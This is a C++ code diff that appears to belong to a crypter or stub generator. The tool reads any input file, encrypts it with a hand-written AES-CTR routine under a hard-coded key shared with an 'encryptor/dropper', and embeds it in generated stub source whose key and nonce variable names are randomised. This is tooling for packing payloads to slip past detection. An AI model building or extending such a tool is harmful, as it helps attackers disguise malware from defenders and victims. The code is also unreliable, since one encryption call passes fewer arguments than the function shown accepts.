@@ -1215,34 +1215,49 @@ inline void addRoundKey(uint8_t* state, const uint8_t* roundKey) {
 
 inline void keyExpansion(const uint8_t* key, uint8_t* roundKeys) {
     uint8_t temp[4];
-    memcpy(roundKeys, key, 16);
     
-    for (int i = 1; i < 11; i++) {
-        memcpy(temp, roundKeys + (i-1)*16 + 12, 4);
-        uint8_t t = temp[0]; temp[0] = temp[1]; temp[1] = temp[2]; temp[2] = temp[3]; temp[3] = t;
-        for (int j = 0; j < 4; j++) temp[j] = sbox[temp[j]];
-        temp[0] ^= (1 << (i-1));
-        for (int j = 0; j < 4; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ temp[j];
-        for (int j = 4; j < 16; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ roundKeys[i*16 + j-4];
+    // Copy the original key
+    for (int i = 0; i < 16; i++) {
+        roundKeys[i] = key[i];
+    }
+    
+    for (int i = 4; i < 44; i++) {
+        for (int j = 0; j < 4; j++) {
+            temp[j] = roundKeys[(i-1)*4 + j];
+        }
+        
+        if (i % 4 == 0) {
+            // RotWord
+            uint8_t t = temp[0];
+            temp[0] = temp[1];
+            temp[1] = temp[2];
+            temp[2] = temp[3];
+            temp[3] = t;
+            
+            // SubWord
+            for (int j = 0; j < 4; j++) {
+                temp[j] = sbox[temp[j]];
+            }
+            
+            // XOR with Rcon
+            temp[0] ^= rcon[i/4 - 1];
+        }
+        
+        for (int j = 0; j < 4; j++) {
+            roundKeys[i*4 + j] = roundKeys[(i-4)*4 + j] ^ temp[j];
+        }
     }
 }
 
 inline void aesEncryptBlock(const uint8_t* input, uint8_t* output, const uint8_t* roundKeys) {
     uint8_t state[16];
-    memcpy(state, input, 16);
+    for (int i = 0; i < 16; i++) state[i] = input[i];
     addRoundKey(state, roundKeys);
-    
     for (int round = 1; round < 10; round++) {
-        subBytes(state);
-        shiftRows(state);
-        mixColumns(state);
-        addRoundKey(state, roundKeys + round * 16);
+        subBytes(state); shiftRows(state); mixColumns(state); addRoundKey(state, roundKeys + round * 16);
     }
-    
-    subBytes(state);
-    shiftRows(state);
-    addRoundKey(state, roundKeys + 10 * 16);
-    memcpy(output, state, 16);
+    subBytes(state); shiftRows(state); addRoundKey(state, roundKeys + 10 * 16);
+    for (int i = 0; i < 16; i++) output[i] = state[i];
 }
 
 inline void incrementCounter(uint8_t* counter) {
@@ -1256,11 +1271,9 @@ inline void aesCtrCrypt(const uint8_t* input, uint8_t* output, size_t length,
                        const uint8_t* key, const uint8_t* nonce) {
     uint8_t roundKeys[176];
     keyExpansion(key, roundKeys);
-    
     uint8_t counter[16];
     uint8_t keystream[16];
-    memcpy(counter, nonce, 16);
-    
+    for (int i = 0; i < 16; i++) counter[i] = nonce[i];
     size_t processed = 0;
     while (processed < length) {
         aesEncryptBlock(counter, keystream, roundKeys);
@@ -1557,7 +1570,7 @@ public:
         // Get the stub template
         std::string stubCode = generateStubTemplate(stubType);
         
-        // Replace placeholders with actual values
+        // Always randomize variable names for all stub types
         std::string keyVarName = "KEY_" + generateRandomString(8);
         std::string nonceVarName = "NONCE_" + generateRandomString(8);
         
@@ -1576,13 +1589,15 @@ public:
         
         // Replace variable names in the code
         size_t keyUsagePos = stubCode.find("{KEY_VAR}");
-        if (keyUsagePos != std::string::npos) {
+        while (keyUsagePos != std::string::npos) {
             stubCode.replace(keyUsagePos, 9, keyVarName);
+            keyUsagePos = stubCode.find("{KEY_VAR}");
         }
         
         size_t nonceUsagePos = stubCode.find("{NONCE_VAR}");
-        if (nonceUsagePos != std::string::npos) {
+        while (nonceUsagePos != std::string::npos) {
             stubCode.replace(nonceUsagePos, 11, nonceVarName);
+            nonceUsagePos = stubCode.find("{NONCE_VAR}");
         }
         
         // Remove embedded data placeholder for standalone stub
@@ -1601,7 +1616,7 @@ public:
         outFile << stubCode;
         outFile.close();
         
-        std::cout << "✓ Standalone stub generated successfully!" << std::endl;
+        std::cout << "\u2713 Standalone stub generated successfully!" << std::endl;
         std::cout << "  Output stub: " << outputFile << std::endl;
         std::cout << "  Stub type: " << stubType << std::endl;
         std::cout << "  Key: " << keyHex << std::endl;
@@ -1611,34 +1626,28 @@ public:
     
     void generateStub(const std::string& inputFile, const std::string& outputFile, 
                      const std::string& stubType = "basic", bool useRandomKey = true) {
-        
         // Read input file
         std::ifstream inFile(inputFile, std::ios::binary);
         if (!inFile.is_open()) {
             std::cerr << "Error: Cannot open input file: " << inputFile << std::endl;
             return;
         }
-        
         // Read the file data
         std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(inFile)),
                                     std::istreambuf_iterator<char>());
         inFile.close();
-        
         if (fileData.empty()) {
             std::cerr << "Error: Input file is empty" << std::endl;
             return;
         }
-        
         // Generate nonce
         uint8_t nonce[16];
         for (int i = 0; i < 16; i++) {
             nonce[i] = simpleRand() & 0xFF;
         }
-        
         // Use the same key system as encryptor/dropper
         uint8_t encKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };
         constexpr size_t keyLen = sizeof(encKey);
-        
         uint8_t key[keyLen];
         const char* envKey = std::getenv("ENCRYPTION_KEY");
         if (envKey && strlen(envKey) >= keyLen) {
@@ -1650,16 +1659,13 @@ public:
                 key[i] = encKey[i];
             }
         }
-        
         // Prepare AES key (expand or truncate to 16 bytes)
         uint8_t aesKey[16];
         for (size_t i = 0; i < 16; ++i) {
             aesKey[i] = key[i % keyLen];
         }
-        
         // Encrypt the data
         aesCtrCrypt(fileData.data(), fileData.size(), aesKey, nonce);
-        
         // Convert to hex strings for stub
         std::string keyHex, nonceHex;
         for (int i = 0; i < 16; i++) {
@@ -1669,71 +1675,49 @@ public:
             sprintf(hex, "%02x", nonce[i]);
             nonceHex += hex;
         }
-        
-
-        
         // Generate stub template
         std::string stubTemplate = generateStubTemplate(stubType);
-        
-        // Replace placeholders
-        std::string keyVar, nonceVar;
-        
-        // Replace placeholders in template
-        size_t pos;
-        
-        // Replace key definition (no obfuscation for basic stub)
-        pos = stubTemplate.find("{KEY_DEFINITION}");
+        // Always randomize variable names for all stub types
+        std::string keyVar = "KEY_" + generateRandomString(8);
+        std::string nonceVar = "NONCE_" + generateRandomString(8);
+        // Replace key definition
+        size_t pos = stubTemplate.find("{KEY_DEFINITION}");
         if (pos != std::string::npos) {
-            if (stubType == "basic") {
-                keyVar = "keyHex";
-                std::string keyDef = "const std::string " + keyVar + " = \"" + keyHex + "\";";
-                stubTemplate.replace(pos, 16, keyDef);
-            } else {
-                stubTemplate.replace(pos, 16, obfuscateStringWithVar(keyHex, keyVar));
-            }
+            std::string keyDef = "const std::string " + keyVar + " = \"" + keyHex + "\";";
+            stubTemplate.replace(pos, 16, keyDef);
         }
-        
-        // Replace nonce definition (no obfuscation for basic stub)
+        // Replace nonce definition
         pos = stubTemplate.find("{NONCE_DEFINITION}");
         if (pos != std::string::npos) {
-            if (stubType == "basic") {
-                nonceVar = "nonceHex";
-                std::string nonceDef = "const std::string " + nonceVar + " = \"" + nonceHex + "\";";
-                stubTemplate.replace(pos, 18, nonceDef);
-            } else {
-                stubTemplate.replace(pos, 18, obfuscateStringWithVar(nonceHex, nonceVar));
-            }
+            std::string nonceDef = "const std::string " + nonceVar + " = \"" + nonceHex + "\";";
+            stubTemplate.replace(pos, 18, nonceDef);
         }
-        
         // Replace embedded data
         pos = stubTemplate.find("{EMBEDDED_DATA}");
         if (pos != std::string::npos) {
             stubTemplate.replace(pos, 15, embedDataAsArray(fileData));
         }
-        
         // Replace key variable
         pos = stubTemplate.find("{KEY_VAR}");
-        if (pos != std::string::npos) {
+        while (pos != std::string::npos) {
             stubTemplate.replace(pos, 9, keyVar);
+            pos = stubTemplate.find("{KEY_VAR}");
         }
-        
         // Replace nonce variable
         pos = stubTemplate.find("{NONCE_VAR}");
-        if (pos != std::string::npos) {
+        while (pos != std::string::npos) {
             stubTemplate.replace(pos, 11, nonceVar);
+            pos = stubTemplate.find("{NONCE_VAR}");
         }
-        
         // Write stub to output file
         std::ofstream outFile(outputFile);
         if (!outFile.is_open()) {
             std::cerr << "Error: Cannot create output file: " << outputFile << std::endl;
             return;
         }
-        
         outFile << stubTemplate;
         outFile.close();
-        
-        std::cout << "✓ Stub generated successfully!" << std::endl;
+        std::cout << "\u2713 Stub generated successfully!" << std::endl;
         std::cout << "  Input file: " << inputFile << std::endl;
         std::cout << "  Output stub: " << outputFile << std::endl;
         std::cout << "  Stub type: " << stubType << std::endl;
